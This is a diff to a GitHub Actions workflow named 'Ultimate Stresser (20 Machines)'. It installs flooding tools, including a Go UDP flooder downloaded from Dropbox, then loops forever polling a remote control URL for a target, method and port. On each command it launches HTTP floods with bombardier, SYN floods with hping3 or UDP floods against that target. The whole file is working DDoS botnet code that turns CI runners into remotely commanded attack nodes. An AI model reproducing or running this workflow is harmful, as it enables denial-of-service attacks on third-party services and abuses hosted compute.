@@ -1,4 +1,4 @@
-name: Ultimate Multi-Tool (20 Machines)
+name: Ultimate Stresser (20 Machines)
 on:
   workflow_dispatch:
 
@@ -15,29 +15,19 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq
-          
-          # Установка Bombardier
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
-          
-          # Установка Bombarida
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
 
-      - name: Run Attack
+      - name: Attack Loop
         env:
           CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          echo "ОЖИДАНИЕ КОМАНДЫ..."
           LAST_ID="0"
-          
           while true; do
-            # Получаем данные с сайта
             DATA=$(curl -s --max-time 5 "$CONTROL_URL")
-            
-            # Проверяем, что получили валидный JSON
             if echo "$DATA" | jq -e . >/dev/null 2>&1; then
               ID=$(echo "$DATA" | jq -r '.id // 0')
-
               if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
                 LAST_ID=$ID
                 METHOD=$(echo "$DATA" | jq -r '.method')
@@ -45,25 +35,21 @@ jobs:
                 PORT=$(echo "$DATA" | jq -r '.port')
                 CONNS=$(echo "$DATA" | jq -r '.conns')
 
-                # Останавливаем предыдущие процессы перед новым запуском
-                sudo killall bombardier hping3 go .output 2>/dev/null || true
+                # Останавливаем всё старое
+                sudo killall bombardier hping3 go 2>/dev/null || true
                 
-                # ВЫВОД В ЛОГИ (как ты просил)
+                # Лог для тебя в консоль
                 echo "--------------------------------------------------"
                 echo "Атака запущена на TARGET: $TARGET"
-                echo "Метод: $METHOD | Потоков: $CONNS"
+                echo "Метод: $METHOD | Машина: ${{ matrix.runner }}"
                 echo "--------------------------------------------------"
 
-                # ЛОГИКА АТАКИ ИЗ ТВОЕГО YML
                 if [ "$METHOD" == "http" ]; then
                   while true; do bombardier -c $CONNS -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
-                
                 elif [ "$METHOD" == "tcp" ]; then
                   sudo hping3 --flood -S -p $PORT $TARGET &
-                
                 elif [ "$METHOD" == "udp" ]; then
                   go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
-                
                 elif [ "$METHOD" == "udp-ddnet" ]; then
                   go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
                 fi
